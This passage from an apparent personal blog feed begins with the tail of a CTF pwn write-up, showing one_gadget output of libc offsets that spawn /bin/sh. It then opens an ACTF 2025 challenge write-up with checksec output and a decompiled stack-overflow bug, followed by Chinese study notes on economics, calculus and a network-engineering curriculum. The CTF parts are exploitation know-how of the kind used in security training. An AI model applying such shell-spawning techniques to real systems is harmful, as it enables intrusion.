rdx is a valid envp<br><br>0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)<br>constraints:<br>  address rbp-0x78 is writable<br>  [rsi] == NULL || rsi == NULL || rsi is a valid argv<br>  [rdx] == NULL || rdx == NULL || rdx is a valid envp<br><br>0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)<br>constraints:<br>  address rbp-0x48 is writable<br>  r13 == NULL || &#123;&quot;/bin/sh&quot;, r13, NULL&#125; is a valid argv<br>  [r12] == NULL || r12 == NULL || r12 is a valid envp<br><br>0xebd38 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])<br>constraints:<br>  address rbp-0x48 is writable<br>  r12 == NULL || &#123;&quot;/bin/sh&quot;, r12, NULL&#125; is a valid argv<br>  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp<br><br>0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])<br>constraints:<br>  address rbp-0x48 is writable<br>  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv<br>  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp<br><br>0xebd43 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])<br>constraints:<br>  address rbp-0x50 is writable<br>  rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv<br>  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp<br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>Personal_wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XCTF_ACTF_2025</title>
    <link href="/ACTF_2025/"/>
    <url>/ACTF_2025/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF-2025"><a href="#ACTF-2025" class="headerlink" title="ACTF_2025"></a>ACTF_2025</h1><h3 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/ACTF_read/deploy$ checksec only_read<br>[*] &#x27;/mnt/d/copy/ACTF_read/deploy/only_read&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h3 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h3><h4 id="main"><a href="#main" class="headerlink" title="main:"></a>main:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x800u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>很明显的栈溢出漏洞，然后就根据该漏洞构造。</strong></p><h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump:"></a>objdump:</h3><p><strong>plt表只存在read函数，且我们可以修改read函数的返回地址来重启程序(函数)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Disassembly of section .plt.sec:<br><br>0000000000401040 &lt;read@plt&gt;:<br>  401040:       f3 0f 1e fa             endbr64<br>  401044:       ff 25 b6 2f 00 00       jmp    QWORD PTR [rip+0x2fb6]        # 404000 &lt;read@GLIBC_2.2.5&gt;<br>  40104a:       66 0f 1f 44 00 00       nop    WORD PTR [rax+rax*1+0x0]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>Personal_wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>经济学原理选修课2025第二学期期末考试复习</title>
    <link href="/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E7%BB%8F%E6%B5%8E%E5%AD%A6%E5%8E%9F%E7%90%86%E9%80%89%E4%BF%AE%E8%AF%BE2025%E7%AC%AC%E4%BA%8C%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95%E5%A4%8D%E4%B9%A0/"/>
    <url>/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E7%BB%8F%E6%B5%8E%E5%AD%A6%E5%8E%9F%E7%90%86%E9%80%89%E4%BF%AE%E8%AF%BE2025%E7%AC%AC%E4%BA%8C%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95%E5%A4%8D%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="大连理工大学经济学原理选修课2025第二学期期末考试复习"><a href="#大连理工大学经济学原理选修课2025第二学期期末考试复习" class="headerlink" title="大连理工大学经济学原理选修课2025第二学期期末考试复习"></a>大连理工大学经济学原理选修课2025第二学期期末考试复习</h1><h2 id="复习资料-超星课堂PPT"><a href="#复习资料-超星课堂PPT" class="headerlink" title="复习资料 [ 超星课堂PPT ]"></a>复习资料 [ 超星课堂PPT ]</h2><h3 id="ppt-1"><a href="#ppt-1" class="headerlink" title="ppt_1"></a>ppt_1</h3><h4 id="经济学的核心问题"><a href="#经济学的核心问题" class="headerlink" title="经济学的核心问题"></a>经济学的核心问题</h4><p><strong>经济学研究的核心问题是人与人之间因资源稀缺性所导致的冲突及其协调</strong></p><h4 id="资源的稀缺性"><a href="#资源的稀缺性" class="headerlink" title="资源的稀缺性"></a>资源的稀缺性</h4><h5 id="经济资源的种类"><a href="#经济资源的种类" class="headerlink" title="经济资源的种类"></a>经济资源的种类</h5><p><img src="/./../00000000/image-20250429134937531.png" alt="image-20250429134937531"></p><h5 id="稀缺性"><a href="#稀缺性" class="headerlink" title="稀缺性"></a>稀缺性</h5><p><strong>资源数量的有限性：社会资源是有限的，在短期内，社会能够生产的汽车和巧克力是一定的</strong></p><p><strong>人类需求的无限性：社会希望生产尽可能多的汽车或巧克力</strong></p><h5 id="稀缺性导致冲突"><a href="#稀缺性导致冲突" class="headerlink" title="稀缺性导致冲突"></a>稀缺性导致冲突</h5><p><img src="/./../00000000/image-20250429135315721.png" alt="image-20250429135315721"></p><h5 id="生产可能性边界"><a href="#生产可能性边界" class="headerlink" title="生产可能性边界"></a>生产可能性边界</h5><p><strong>在资源既定的情况下，一个社会所能生产的产品的最大产量的组合。</strong></p><p><img src="/./../00000000/image-20250429135748537.png" alt="image-20250429135748537"></p><p><strong>ABCDEF都是生产可能性边界</strong></p><h4 id="对象：人的行为及其交互作用"><a href="#对象：人的行为及其交互作用" class="headerlink" title="对象：人的行为及其交互作用"></a><strong>对象：人的行为及其交互作用</strong></h4><p><img src="/./../00000000/image-20250429135605997.png" alt="image-20250429135605997"></p><h5 id="个人决策：选择与机会成本"><a href="#个人决策：选择与机会成本" class="headerlink" title="个人决策：选择与机会成本"></a>个人决策：选择与机会成本</h5><p><img src="/./../00000000/image-20250429135703463.png" alt="image-20250429135703463"></p><h5 id="选择与机会成本"><a href="#选择与机会成本" class="headerlink" title="选择与机会成本"></a>选择与机会成本</h5><p><img src="/./../00000000/image-20250429135853529.png" alt="image-20250429135853529"></p><h5 id="个体间的交互作用"><a href="#个体间的交互作用" class="headerlink" title="个体间的交互作用"></a>个体间的交互作用</h5><p><strong>交互作用：一个人对另一个人作出回应</strong></p><p><strong>交互作用受到信息的影响</strong></p><h4 id="目标-效率"><a href="#目标-效率" class="headerlink" title="目标:效率"></a>目标:效率</h4><p><img src="/./../00000000/image-20250429140108505.png" alt="image-20250429140108505"></p><h5 id="资源利用的基本问题"><a href="#资源利用的基本问题" class="headerlink" title="资源利用的基本问题"></a>资源利用的基本问题</h5><p>1.<strong>为什么资源得不到充分利用？（充分就业）</strong></p><p>2.<strong>对给定的资源，为什么产量时高时低？（经济波动）</strong></p><p>3.<strong>货币购买力的变动对汽车和巧克力的生产有什么影响？（通货膨胀）</strong></p><p>4.<strong>在给定的资源条件下，如何使社会总产出越来越多？（经济增长、技术进步、资本积累、制度）</strong></p><h5 id="利用效率"><a href="#利用效率" class="headerlink" title="利用效率"></a>利用效率</h5><p><img src="/./../00000000/image-20250429140325406.png" alt="image-20250429140325406"></p><h5 id="资源配置的基本问题"><a href="#资源配置的基本问题" class="headerlink" title="资源配置的基本问题"></a>资源配置的基本问题</h5><p>1.<strong>生产什么，生产多少</strong></p><p>2..<strong>如何生产</strong></p><p>3.<strong>为谁生产</strong></p><h5 id="帕累托效率"><a href="#帕累托效率" class="headerlink" title="帕累托效率"></a>帕累托效率</h5><p><strong>帕累托改善</strong>：在不损害别人福利的前提下，某个人的福利得到改善</p><p><strong>帕累托效率</strong>：在不损害别人经济福利的前提下，如果已不可能找到资源使用的其他方法来增加任何一个人的福利，此时资源配置效率最高，称为帕累托效率；或者说达到帕累托最优</p><h4 id="协调的经济制度"><a href="#协调的经济制度" class="headerlink" title="协调的经济制度"></a>协调的经济制度</h4><p><strong>制度的经济内涵：规则</strong></p><p><strong>经济制度的核心问题：由谁决策？</strong></p><h5 id="关心由谁决策的原因"><a href="#关心由谁决策的原因" class="headerlink" title="关心由谁决策的原因"></a>关心由谁决策的原因</h5><p>决策的分类:</p><p>1.<strong>花别人的钱为别人办事</strong></p><p>2.<strong>花别人的钱为自己办事</strong></p><p>3.<strong>花自己的钱为别人办事</strong></p><p>4.<strong>花自己的钱为自己办事</strong></p><h5 id="经济制度的分类"><a href="#经济制度的分类" class="headerlink" title="经济制度的分类"></a>经济制度的分类</h5><p><strong>市场经济(Market economy)</strong>：由私人部门决策——<strong>老百姓（企业和家庭）说了算，自下而上</strong></p><p><strong>计划经济(Planned economy)</strong>：由政府（公共部门）决策——<strong>政府说了算，自上而下</strong></p><p><strong>混合经济(Mixed economy)</strong></p><h4 id="经济学原理基本问题"><a href="#经济学原理基本问题" class="headerlink" title="经济学原理基本问题"></a>经济学原理基本问题</h4><p>1.<strong>生产什么，生产多少</strong></p><p>2..<strong>如何生产</strong></p><p>3.<strong>为谁生产</strong></p><p>4.<strong>谁作出经济决策，依据什么程序？</strong></p>]]></content>
    
    
    <categories>
      
      <category>大连理工大学学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>微积分下</title>
    <link href="/%E5%BE%AE%E7%A7%AF%E5%88%86%E4%B8%8B/"/>
    <url>/%E5%BE%AE%E7%A7%AF%E5%88%86%E4%B8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="微积分下"><a href="#微积分下" class="headerlink" title="微积分下"></a>微积分下</h1><h2 id="期中考试复习-无穷级数，向量代数与空间解析几何，多元函数微分学及其应用"><a href="#期中考试复习-无穷级数，向量代数与空间解析几何，多元函数微分学及其应用" class="headerlink" title="期中考试复习 [ 无穷级数，向量代数与空间解析几何，多元函数微分学及其应用 ]"></a>期中考试复习 [ 无穷级数，向量代数与空间解析几何，多元函数微分学及其应用 ]</h2><h3 id="无穷级数"><a href="#无穷级数" class="headerlink" title="无穷级数"></a>无穷级数</h3><h4 id="5-1-常数项级数的概率与基本性质"><a href="#5-1-常数项级数的概率与基本性质" class="headerlink" title="5.1 常数项级数的概率与基本性质"></a>5.1 常数项级数的概率与基本性质</h4><h5 id="课后简单习题回顾练手"><a href="#课后简单习题回顾练手" class="headerlink" title="课后简单习题回顾练手"></a>课后简单习题回顾练手</h5><p><img src="/./../00000000/image-20250426105553950.png" alt="image-20250426105553950"></p><table><thead><tr><th>题号</th><th>提示</th></tr></thead><tbody><tr><td>1</td><td>求和</td></tr><tr><td>2</td><td>裂项求和</td></tr><tr><td>3</td><td>裂项求和</td></tr><tr><td>4</td><td>求和</td></tr></tbody></table><p><img src="/./../00000000/image-20250426105604524.png" alt="image-20250426105604524"></p><table><thead><tr><th>题号</th><th>提示</th></tr></thead><tbody><tr><td>1</td><td>两个收敛级数</td></tr><tr><td>2</td><td>取极限第n项不为0</td></tr><tr><td>3</td><td>取极限第n项不为0</td></tr><tr><td>4</td><td>两个收敛级数</td></tr></tbody></table><p><strong>一个收敛级数与一个发散级数逐项相加所得级数一定发散，两个发散级数逐项相加所得的级数可能收敛</strong></p><p><img src="/./../00000000/image-20250426110356322.png" alt="image-20250426110356322"></p><p><strong>拆分为奇偶项再作化简</strong></p><h5 id="课堂习题"><a href="#课堂习题" class="headerlink" title="课堂习题"></a>课堂习题</h5><h6 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h6><p><img src="/./../00000000/image-20250426143912288.png" alt="image-20250426143912288"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426143942487.png" alt="image-20250426143942487"></p><h6 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h6><p><img src="/./../00000000/image-20250426143951422.png" alt="image-20250426143951422"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144019737.png" alt="image-20250426144019737"></p><h6 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h6><p><img src="/./../00000000/image-20250426144136277.png" alt="image-20250426144136277"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144209286.png" alt="image-20250426144209286"></p><h6 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h6><p><img src="/./../00000000/image-20250426144235739.png" alt="image-20250426144235739"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144244703.png" alt="image-20250426144244703"></p><h6 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h6><p><img src="/./../00000000/image-20250426144310441.png" alt="image-20250426144310441"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144418799.png" alt="image-20250426144418799"></p><h6 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h6><p><img src="/./../00000000/image-20250426144443542.png" alt="image-20250426144443542"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144504338.png" alt="image-20250426144504338"></p><h6 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h6><p><img src="/./../00000000/image-20250426144524838.png" alt="image-20250426144524838"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144545872.png" alt="image-20250426144545872"></p><h6 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h6><p><img src="/./../00000000/image-20250426144747201.png"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144817610.png" alt="image-20250426144817610"></p><h6 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h6><p><img src="/./../00000000/image-20250426144830086.png" alt="image-20250426144830086"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426144848658.png" alt="image-20250426144848658"></p><h4 id="5-2-正项级数敛散性的判别法"><a href="#5-2-正项级数敛散性的判别法" class="headerlink" title="5.2 正项级数敛散性的判别法"></a>5.2 正项级数敛散性的判别法</h4><h5 id="课后简单习题回顾练手-1"><a href="#课后简单习题回顾练手-1" class="headerlink" title="课后简单习题回顾练手"></a>课后简单习题回顾练手</h5><p><img src="/./../00000000/image-20250426110540830.png" alt="image-20250426110540830"></p><p><strong>比值判别法</strong></p><p><img src="/./../00000000/image-20250426110611267.png" alt="image-20250426110611267"></p><p><img src="/./../00000000/image-20250426110641462.png" alt="image-20250426110641462"></p><p><img src="/./../00000000/image-20250426110649146.png" alt="image-20250426110649146"></p><p><strong>基本不等式 + 比较判别法</strong></p><p><img src="/./../00000000/image-20250426110749748.png" alt="image-20250426110749748"></p><p><img src="/./../00000000/image-20250426110948983.png" alt="image-20250426110948983"></p><table><thead><tr><th>题号</th><th>提示</th></tr></thead><tbody><tr><td>1</td><td>举一个P级数的例子</td></tr><tr><td>2</td><td>正确，证明在5.1的课堂习题末尾</td></tr><tr><td>3</td><td>前对，后错 [ 0  ，1交错的级数 ]</td></tr></tbody></table><h4 id="5-3-任意项级数敛散性判别法"><a href="#5-3-任意项级数敛散性判别法" class="headerlink" title="5.3  任意项级数敛散性判别法"></a>5.3  任意项级数敛散性判别法</h4><h5 id="课后简单习题回顾练手-2"><a href="#课后简单习题回顾练手-2" class="headerlink" title="课后简单习题回顾练手"></a>课后简单习题回顾练手</h5><p><img src="/./../00000000/image-20250426113924696.png" alt="image-20250426113924696"></p><p><img src="/./../00000000/image-20250426150007774.png" alt="image-20250426150007774"></p><p><strong>基本不等式</strong></p><p><img src="/./../00000000/image-20250426150139281.png" alt="image-20250426150139281"></p><p><strong>方法一</strong></p><p><img src="/./../00000000/image-20250426150526512.png" alt="image-20250426150526512"></p><p><strong>方法二</strong></p><p><img src="/./../00000000/image-20250426165418638.png" alt="image-20250426165418638"></p><p><img src="/./../00000000/image-20250426150557490.png" alt="image-20250426150557490"></p><p><img src="/./../00000000/image-20250426165536872.png" alt="image-20250426165536872"></p><p><img src="/./../00000000/image-20250426170156925.png" alt="image-20250426170156925"></p><table><thead><tr><th align="center">题号</th><th align="center">提示</th><th align="center">答案</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"></td><td align="center">绝对收敛</td></tr><tr><td align="center">2</td><td align="center">等价无穷小【 比较判别法 】</td><td align="center">条件收敛</td></tr><tr><td align="center">3</td><td align="center"></td><td align="center">绝对收敛</td></tr><tr><td align="center">4</td><td align="center"></td><td align="center">发散</td></tr><tr><td align="center">5</td><td align="center"></td><td align="center">绝对收敛</td></tr></tbody></table><h5 id="课堂习题-1"><a href="#课堂习题-1" class="headerlink" title="课堂习题"></a>课堂习题</h5><h6 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h6><p><img src="/./../00000000/image-20250426172347896.png" alt="image-20250426172347896"></p><p><strong>answer：D</strong></p><p><img src="/./../00000000/image-20250426172415415.png" alt="image-20250426172415415"></p><h6 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h6><p><img src="/./../00000000/image-20250426172516674.png" alt="image-20250426172516674"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426172532294.png" alt="image-20250426172532294"></p><h6 id="3-1"><a href="#3-1" class="headerlink" title="3."></a>3.</h6><p><img src="/./../00000000/image-20250426172554175.png" alt="image-20250426172554175"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426172654106.png" alt="image-20250426172654106"></p><h6 id="4-1"><a href="#4-1" class="headerlink" title="4."></a>4.</h6><p><img src="/./../00000000/image-20250426172711102.png" alt="image-20250426172711102"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426172937841.png" alt="image-20250426172937841"></p><h6 id="5-1"><a href="#5-1" class="headerlink" title="5."></a>5.</h6><p><img src="/./../00000000/image-20250426173030758.png" alt="image-20250426173030758"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173053080.png" alt="image-20250426173053080"></p><p><img src="/./../00000000/image-20250426173112641.png" alt="image-20250426173112641"></p><h6 id="6-1"><a href="#6-1" class="headerlink" title="6."></a>6.</h6><p><img src="/./../00000000/image-20250426173138988.png" alt="image-20250426173138988"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173157578.png" alt="image-20250426173157578"></p><h6 id="7-1"><a href="#7-1" class="headerlink" title="7."></a>7.</h6><p><img src="/./../00000000/image-20250426173215124.png" alt="image-20250426173215124"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173232509.png" alt="image-20250426173232509"></p><h6 id="8-1"><a href="#8-1" class="headerlink" title="8."></a>8.</h6><p><img src="/./../00000000/image-20250426173255405.png" alt="image-20250426173255405"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173335611.png" alt="image-20250426173335611"></p><h6 id="9-1"><a href="#9-1" class="headerlink" title="9."></a>9.</h6><p><img src="/./../00000000/image-20250426173410524.png" alt="image-20250426173410524"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173451115.png" alt="image-20250426173451115"></p><p><img src="/./../00000000/image-20250426173506969.png" alt="image-20250426173506969"></p><h6 id="10"><a href="#10" class="headerlink" title="10."></a>10.</h6><p><img src="/./../00000000/image-20250426173534838.png" alt="image-20250426173534838"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173605662.png" alt="image-20250426173605662"></p><h6 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h6><p><img src="/./../00000000/image-20250426173630094.png" alt="image-20250426173630094"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173652353.png" alt="image-20250426173652353"></p><h6 id="12"><a href="#12" class="headerlink" title="12."></a>12.</h6><p><img src="/./../00000000/image-20250426173717297.png" alt="image-20250426173717297"></p><p><img src="/./../00000000/image-20250426173726008.png" alt="image-20250426173726008"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173740540.png" alt="image-20250426173740540"></p><h6 id="13"><a href="#13" class="headerlink" title="13."></a>13.</h6><p><img src="/./../00000000/image-20250426173809453.png" alt="image-20250426173809453"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173839186.png" alt="image-20250426173839186"></p><h6 id="14"><a href="#14" class="headerlink" title="14."></a>14.</h6><p><img src="/./../00000000/image-20250426173901922.png" alt="image-20250426173901922"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426173923556.png" alt="image-20250426173923556"></p><p><img src="/./../00000000/image-20250426173934108.png" alt="image-20250426173934108"></p><h6 id="15"><a href="#15" class="headerlink" title="15."></a>15.</h6><p><img src="/./../00000000/image-20250426173948670.png" alt="image-20250426173948670"></p><p><strong>answer</strong></p><p><img src="/./../00000000/image-20250426174007413.png" alt="image-20250426174007413"></p><h4 id="5-4-幂级数"><a href="#5-4-幂级数" class="headerlink" title="5.4 幂级数"></a>5.4 幂级数</h4><p><strong>课后简单习题回顾练手</strong></p><p><img src="/./../00000000/image-20250429144847460.png" alt="image-20250429144847460"></p><table><thead><tr><th align="center">题号</th><th align="center">收敛域</th><th align="center">收敛范围</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">4</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">5</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">6</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">7</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">8</td><td align="center"></td><td align="center"></td></tr></tbody></table><p><img src="/./../00000000/image-20250429144903356.png" alt="image-20250429144903356"></p><table><thead><tr><th align="center">题号</th><th align="center">收敛域</th><th align="center">收敛半径</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">4</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">5</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">6</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">7</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">8</td><td align="center"></td><td align="center"></td></tr></tbody></table><p><img src="/./../00000000/image-20250429145136410.png" alt="image-20250429145136410"></p><p><img src="/./../00000000/image-20250429145156637.png" alt="image-20250429145156637"></p><p><img src="/./../00000000/image-20250429145206422.png" alt="image-20250429145206422"></p><p><img src="/./../00000000/image-20250429145221259.png" alt="image-20250429145221259"></p>]]></content>
    
    
    <categories>
      
      <category>大连理工大学学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大连理工大学网络工程培养方案分析与计划安排</title>
    <link href="/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%B9%E5%85%BB%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%A1%E5%88%92%E5%AE%89%E6%8E%92/"/>
    <url>/%E5%A4%A7%E8%BF%9E%E7%90%86%E5%B7%A5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%B9%E5%85%BB%E6%96%B9%E6%A1%88%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%A1%E5%88%92%E5%AE%89%E6%8E%92/</url>
    
    <content type="html"><![CDATA[<h1 id="大连理工大学网络工程培养方案分析"><a href="#大连理工大学网络工程培养方案分析" class="headerlink" title="大连理工大学网络工程培养方案分析"></a>大连理工大学网络工程培养方案分析</h1><p><strong>刨去一些大空话，总结一些小空话和相关毕业要求</strong></p><h2 id="专业毕业要求-小空话"><a href="#专业毕业要求-小空话" class="headerlink" title="专业毕业要求 [ 小空话 ]"></a>专业毕业要求 [ 小空话 ]</h2><p>1.工程知识：能够将数学、自然科学、计算、工程基础和专业知识用于解决计算 机网络系统分析、设计、开发、维护过程中的复杂工程问题；</p><p>2.问题分析：能够应用数学、自然科学和网络工程科学的第一性原理，并通过文 献研究，识别、表达并通过文献研究分析复杂网络工程问题，综合考虑可持续发展的 要求，以获得有效结论；</p><p>3.设计&#x2F;开发解决方案：针对复杂工程问题，能够应用网络工程的基本理论和方 法，开发和设计满足特定需求的网络系统、单元（部件）或工艺流程，体现创新性， 并从健康与安全、全生命周期成本与净零碳要求、法律与伦理、社会与文化等角度考 虑可行性； </p><p>4.研究：能够基于网络工程科学原理并采用网络工程科学方法进行研究，通过设 计实验、分析数据及信息综合解决复杂网络工程问题，并得到合理有效的结论；  5.使用现代工具：在解决复杂网络工程问题过程中，能够开发、选择与使用恰当 的技术、资源、现代网络工程类设计与开发工具、信息技术工具，包括对复杂工程问 题的预测与模拟，并能够理解其局限性；  </p><p>6.工程与可持续发展：在解决复杂工程问题时，能够基于网络工程相关背景知 识，分析和评价网络工程实践对健康、安全、环境、法律以及经济和社会可持续发展 的影响，并理解应承担的责任；  </p><p>7.伦理和职业规范：有工程报国、工程为民的意识，具有人文社会科学素养和社 会责任感，能够理解和应用工程伦理，在网络工程实践中遵守工程职业道德、规范和 相关法律，履行责任；  </p><p>8.个人和团队：能够在多样化、多学科背景下的团队中承担个体、团队成员以及 负责人的角色； </p><p> 9.沟通：能够就复杂网络工程问题与业界同行及社会公众进行有效沟通和交流， 包括撰写报告和设计文稿、陈述发言、清晰表达或回应指令；能够在跨文化背景下进 行沟通和交流，理解、尊重语言和文化差异；  </p><p>10.项目管理：理解并掌握工程项目相关的管理原理与经济决策方法，并能够在 多学科环境中应用；  </p><p>11.终身学习：具有自主学习和终身学习的意识和能力，能够理解广泛的技术变 革对工程和社会的影响，适应新技术变革，具有批判性思维能力。 </p><h2 id="培养目标与毕业要求关系矩阵"><a href="#培养目标与毕业要求关系矩阵" class="headerlink" title="培养目标与毕业要求关系矩阵"></a>培养目标与毕业要求关系矩阵</h2><p><img src="/./../00000000/image-20250421165823905.png" alt="image-20250421165823905"></p><h2 id="毕业学分要求"><a href="#毕业学分要求" class="headerlink" title="毕业学分要求"></a>毕业学分要求</h2><p><img src="/./../00000000/image-20250421165859824.png" alt="image-20250421165859824"></p><h2 id="授予学位"><a href="#授予学位" class="headerlink" title="授予学位"></a>授予学位</h2><p><strong>工学学士学位</strong></p><h2 id="一级学科"><a href="#一级学科" class="headerlink" title="一级学科"></a>一级学科</h2><p><strong>软件工程</strong></p><h2 id="专业核心课程"><a href="#专业核心课程" class="headerlink" title="专业核心课程"></a>专业核心课程</h2><p><strong>模拟与数字电路、数据结构与算法、计算机组织与结构、计算机网络、操作系统、 数据库系统、软件工程、网络信息安全、网络编程技术</strong></p><h2 id="专业课程体系及教学计划"><a href="#专业课程体系及教学计划" class="headerlink" title="专业课程体系及教学计划"></a>专业课程体系及教学计划</h2><p><img src="/./../00000000/image-20250421170124919.png" alt="image-20250421170124919"></p><p><img src="/./../00000000/image-20250421170431834.png" alt="image-20250421170431834"></p><p><img src="/./../00000000/image-20250421170542204.png" alt="image-20250421170542204"></p><p><img src="/./../00000000/image-20250421170554174.png" alt="image-20250421170554174"></p><p><img src="/./../00000000/image-20250421170605536.png" alt="image-20250421170605536"></p><h2 id="课程修读要求"><a href="#课程修读要求" class="headerlink" title="课程修读要求"></a>课程修读要求</h2><p><strong>本专业第一学年执行信息技术学域（二）培养方案，从第二学年开始专业课程学 习。四年修读总学分数为150学分。</strong></p><h2 id="课程体系与毕业要求关系矩阵"><a href="#课程体系与毕业要求关系矩阵" class="headerlink" title="课程体系与毕业要求关系矩阵"></a>课程体系与毕业要求关系矩阵</h2><p><img src="/./../00000000/image-20250421171413078.png" alt="image-20250421171413078"></p><p><img src="/./../00000000/image-20250421171425232.png" 